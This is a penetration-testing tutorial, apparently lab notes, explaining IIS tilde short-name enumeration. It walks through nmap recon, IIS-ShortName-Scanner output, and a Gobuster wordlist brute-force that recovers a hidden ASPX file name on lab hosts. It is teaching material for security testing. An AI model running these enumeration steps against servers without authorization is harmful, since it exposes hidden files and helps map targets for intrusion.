# IIS Tilde Enumeration

## What It Is
IIS tilde (`~`) enumeration is a technique for uncovering **hidden files, directories, and 8.3 short file names** on some Microsoft IIS servers. It abuses how Windows auto-generates a legacy 8-character short name for every file/folder (the "8.3 format") — and IIS can be tricked into revealing these short names even for files meant to stay hidden.

> [!info] Why it works
> Every file/folder on Windows gets a short name (8 chars + 3-char extension) alongside its normal name. These short names can be used in URLs to reach the underlying resource, bypassing the "hidden" intent of the long name.

## How the Attack Works
Requests are sent with a `~` followed by different character combinations. A `200 OK` confirms a matching short-name prefix, and the attacker narrows it down letter by letter.

```
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Say a hidden folder `SecretDocuments` exists. The process narrows down like this:

```
~s      → 200 OK (short name starts with "s")
~se     → 200 OK (narrowed to "se")
~sec    → 200 OK (narrowed to "sec")
~secret → 200 OK → short name = secret~1
```

Once `secret~1` is known, files inside can be reached directly:
```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

The same trick reveals 8.3 short names for **files**, e.g. `somefi~1.txt`. The number after `~` disambiguates files with similar names in the same folder:
- `somefile.txt` → `somefi~1.txt`
- `somefile1.txt` → `somefi~2.txt`

## Enumeration Workflow

### Step 1 — Recon with Nmap
```bash
nmap -p- -sV -sC --open 10.129.224.91

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
```
IIS 7.5 confirmed → viable target for tilde enumeration.

### Step 2 — Automated Scan (IIS-ShortName-Scanner)
Manually testing every letter combo is tedious — use the automated tool instead.

- Tool: **IIS-ShortName-Scanner** (Java)
- Source: https://github.com/irsdl/IIS-ShortName-Scanner
- Requires Oracle Java installed locally/on Pwnbox

```bash
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```
(Hit Enter when prompted for a proxy → "No")

Example output:
```
Result: Vulnerable!
Used HTTP method: OPTIONS
Suffix (magic part): /~1/
Identified directories: 2
  ASPNET~1
  UPLOAD~1
Identified files: 3
  CSASPX~1.CS
  CSASPX~1.CS??
  TRANSF~1.ASP
```

### Step 3 — Brute-Force the Remaining Full Filename
If direct GET access to a discovered short name is blocked (e.g. `TRANSF~1.ASP`), brute-force the full name using a wordlist filtered to match the known prefix.

**Generate a targeted wordlist:**
```bash
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```
| Part | What it does |
|---|---|
| `egrep -r ^transf` | Recursively finds lines starting with "transf" across all wordlists |
| `sed 's/^[^:]*://'` | Strips the filename+colon prefix that `egrep -r` adds |
| `> /tmp/list.txt` | Saves cleaned results |

**Brute-force with Gobuster:**
```bash
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```
Result:
```
/transfer.aspx  (Status: 200) [Size: 941]
```
Full filename recovered from the short name `TRANSF~1.ASP`.

## Quick Recap
| Stage | Tool | Outcome |
|---|---|---|
| Recon | `nmap -sV -sC` | Confirms IIS version (e.g. 7.5) |
| Scan | IIS-ShortName-Scanner | Reveals 8.3 short names of hidden dirs/files |
| Brute-force | `egrep`/`sed` + Gobuster | Recovers full filenames from short-name prefixes |
